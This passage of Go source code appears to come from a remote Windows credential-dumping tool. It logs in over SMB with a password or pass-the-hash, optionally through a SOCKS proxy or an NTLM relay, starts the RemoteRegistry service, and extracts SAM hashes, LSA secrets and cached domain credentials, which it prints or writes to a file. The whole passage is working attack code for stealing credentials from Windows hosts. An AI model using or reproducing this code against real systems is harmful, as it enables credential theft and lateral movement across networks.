		smbOptions.Initiator = &spnego.NTLMInitiator{
			User:      username,
			Password:  password,
			Hash:      hashBytes,
			Domain:    domain,
			LocalUser: localUser,
		}
	}

	// Only if not using SOCKS
	if socksIP == "" {
		smbOptions.DialTimeout, err = time.ParseDuration(fmt.Sprintf("%ds", dialTimeout))
		if err != nil {
			log.Errorln(err)
			return
		}
	}

	var session *smb.Connection

	if socksIP != "" {
		dialSocksProxy, err := proxy.SOCKS5("tcp", fmt.Sprintf("%s:%d", socksIP, socksPort), nil, proxy.Direct)
		if err != nil {
			log.Errorln(err)
			return
		}
		smbOptions.ProxyDialer = dialSocksProxy
	}

	if relay {
		smbOptions.RelayPort = relayPort
		session, err = smb.NewRelayConnection(smbOptions)
	} else {
		session, err = smb.NewConnection(smbOptions)
	}
	if err != nil {
		log.Criticalln(err)
		return
	}
	defer session.Close()

	if session.IsSigningRequired() {
		log.Noticeln("[-] Signing is required")
	} else {
		log.Noticeln("[+] Signing is NOT required")
	}

	if session.IsAuthenticated() {
		log.Noticef("[+] Login successful as %s\n", session.GetAuthUsername())
	} else {
		log.Noticeln("[-] Login failed")
		return
	}

	// Connect to IPC$ share
	share = "IPC$"
	err = session.TreeConnect(share)
	if err != nil {
		log.Errorln(err)
		return
	}
	defer session.TreeDisconnect(share)

	// Check if RemoteRegistry is running, and if not, enable it
	registryStarted, registryDisabled, err := startRemoteRegistry(session, share)
	if err != nil {
		log.Errorln(err)
		return
	}

	defer func() {
		if !registryStarted {
			err = stopRemoteRegistry(session, share, registryDisabled)
			if err != nil {
				log.Errorf("Failed to restore status of RemoteRegistry service with error: %s\n", err)
			}
		}
	}()

	// Open connection to Windows Remote Registry pipe
	f, err := session.OpenFile(share, msrrp.MSRRPPipe)
	if err != nil {
		log.Errorln(err)
		return
	}
	defer f.CloseFile()

	// Bind to Windows Remote Registry service
	bind, err := dcerpc.Bind(f, msrrp.MSRRPUuid, msrrp.MSRRPMajorVersion, msrrp.MSRRPMinorVersion, msrrp.NDRUuid)
	if err != nil {
		log.Errorln("Failed to bind to service")
		log.Errorln(err)
		return
	}

	// RPCCon is a wrapper for an RPC Bind that implements the Remote Registry functions
	rpccon := msrrp.NewRPCCon(bind)

	hKey, err := rpccon.OpenBaseKey(msrrp.HKEYLocalMachine)
	if err != nil {
		log.Errorln(err)
		return
	}
	defer rpccon.CloseKeyHandle(hKey)

	if restoreDacl {
		restoreDaclFromBackup(rpccon, hKey)
		return
	}

	if dump {
		err = dumpOffline(session, rpccon, hKey, "C:/windows/temp")
		if err != nil {
			log.Errorln(err)
			return
		}
	} else {
		defer func() {
			// If calling defer on tryRollbackChanges directly, all the arguments
			// will be locked to their current values at time of calling defer
			tryRollbackChanges(rpccon, hKey, registryKeysModified)
		}()

		if sam {
			err = dumpSAM(rpccon, hKey)
			if err != nil {
				log.Errorln(err)
				return
			}
		}
		if lsaSecrets {
			err = dumpLSASecrets(rpccon, hKey)
			if err != nil {
				log.Errorln(err)
				return
			}
		}
		if dcc2 {
			err = dumpDCC2Cache(rpccon, hKey)
			if err != nil {
				log.Errorln(err)
				return
			}
		}

		// Print results
		var out io.Writer
		if outputFile != nil {
			out = outputFile
		} else {
			out = os.Stdout
		}
		//TODO Write name of host?
		if len(samSecretList) > 0 {
			fmt.Fprintln(out, "[*] Dumping local SAM hashes")
			for i := range samSecretList {
				samSecretList[i].printSecret(out)
			}
		}
		if len(lsaSecretList) > 0 {
			fmt.Fprintln(out, "[*] Dumping LSA Secrets")
			for i := range lsaSecretList {
				lsaSecretList[i].printSecret(out)
			}
		}
		if len(dcc2SecretList) > 0 {
			fmt.Fprintln(out, "[*] Dumping cached domain credentials (domain/username:hash)")
			for i := range dcc2SecretList {
				dcc2SecretList[i].printSecret(out)
			}
		}
	}
}
